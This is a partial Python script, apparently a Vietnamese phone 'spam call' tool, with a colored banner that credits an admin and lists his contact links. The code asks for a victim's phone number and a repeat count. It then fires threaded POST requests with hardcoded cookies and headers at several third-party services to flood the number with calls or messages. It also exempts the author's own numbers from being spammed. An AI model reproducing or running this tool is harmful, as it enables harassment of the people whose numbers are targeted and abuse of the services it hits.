...
vang = "\033[1;33m"
tim = "\033[1;35m"
mau_dac_biet = '\33[32;5;245m\33[1m\33[38;5;51m'
#-----[BẮT ĐẦU]-----#
...
\033[1;31m────────────────────────────────────────────────────────────
{do}[{trang}=.={do}] {vang}TOOL SPAM CALL
{do}[{trang}=.={do}] \033[1;35mADMIN: {mau_dac_biet}BÙI THANH THÔNG
{do}[{trang}=.={do}] \033[1;36mZALO: \033[1;31m0587163009
{do}[{trang}=.={do}] \033[1;32mBOX SUPPORT: {trang}https://zalo.me/g/lrbjht562
{do}[{trang}=.={do}] {xanh_duong}YOUTUBE: {trang}https://www.youtube.com/@buithanhthongoffcial
\033[1;31m────────────────────────────────────────────────────────────
...
for h in banner:
       ...
       sys.stdout.flush()
       sleep(0.004)
phone = input('\033[1;31m[\033[1;37m</>\033[1;31m] \033[1;32mNhập Số Cần Spam:\033[1;33m ~>\033[1;36m ')
amount = int(input('\033[1;31m[\033[1;37m</>\033[1;31m] \033[1;37m\033[1;32mSố Lượng:\033[1;33m ~>\033[1;36m '))
...
'phone': '+84'+phone[1:11]}
##chặn spam
l_phone = ["0587163009", "587163009", "84587163009", "0363918366", "363918366", "84363918366"]

if phone in l_phone:
    print("Số này không thể spam")
    exit()
...
def tobi(phone):
    cookies = {
        ...
        'cf_clearance': 'V0dwq4Fn4o1GNyxFv5htNHDZ2vZPGEAM53zuseO7Fe0-1686142646-0-160',
        '_gcl_au': '1.1.407087509.1686353305',
        '_ga': 'GA1.2.663989590.1686353305',
    }

    headers = {
        'authority': 'tobizzx.xyz',
        ...
        # 'cookie': 'serverChoice=Server-IPv2; cf_clearance=V0dwq4Fn4o1GNyxFv5htNHDZ2vZPGEAM53zuseO7Fe0-1686142646-0-160; _gcl_au=1.1.407087509.1686353305; _ga=GA1.2.663989590.1686353305',
        'origin': 'https://tobizzx.xyz',
        'referer': 'https://tobizzx.xyz/tools/',
    ...
    response = requests.post('https://tobizzx.xyz/tools/', cookies=cookies, headers=headers, data=data)
def loship(phone):
...
def BBot(phone, amount):
	for i in range(amount):
		...
		time.sleep(1)
		threading.submit(callv10,phone)
		...
		threading.submit(callv11,phone)
		...
		threading.submit(callv12,phone)
